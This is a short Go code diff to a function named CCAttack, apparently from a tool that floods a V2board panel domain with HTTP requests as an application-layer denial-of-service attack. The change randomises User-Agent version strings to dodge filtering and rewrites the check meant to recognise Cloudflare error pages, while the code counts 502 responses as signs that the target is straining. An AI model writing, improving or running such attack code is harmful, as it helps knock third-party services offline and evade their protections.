@@ -85,7 +85,7 @@ func CCAttack(p *Nodes, counts *int, status *int) (err error) {
 	resp, err := resty.New().
 		SetTransport(transport).SetTLSClientConfig(&tls.Config{ServerName: config.Cfg.V2boardDomain}).
 		R().SetHeaders(map[string]string{
-		"User-Agent": fmt.Sprintf("%s/%s", randUA(), strings.Split(uuid.New().String(), "-")[rand.Intn(5)]),
+		"User-Agent": fmt.Sprintf("%s/%d.%d.%d", randUA(), rand.Intn(100), rand.Intn(100), rand.Intn(100)),
 		"Host":       config.Cfg.V2boardDomain,
 	}).
 		SetContext(ctx).Get(baseURL.String())
@@ -99,7 +99,7 @@ func CCAttack(p *Nodes, counts *int, status *int) (err error) {
 	case resp.StatusCode() == 502:
 		fmt.Printf("[%d] %d\n", *counts, resp.StatusCode())
 		return
-	case !strings.Contains(resp.String(), "cloudflare") && err == nil:
+	case (!strings.Contains(resp.String(), "cloudflare") || !strings.Contains(resp.String(), "error code")) && err == nil:
 		switch {
 		case buf["data"] != nil:
 			fmt.Printf("[%d] %d\n", *counts, resp.StatusCode())
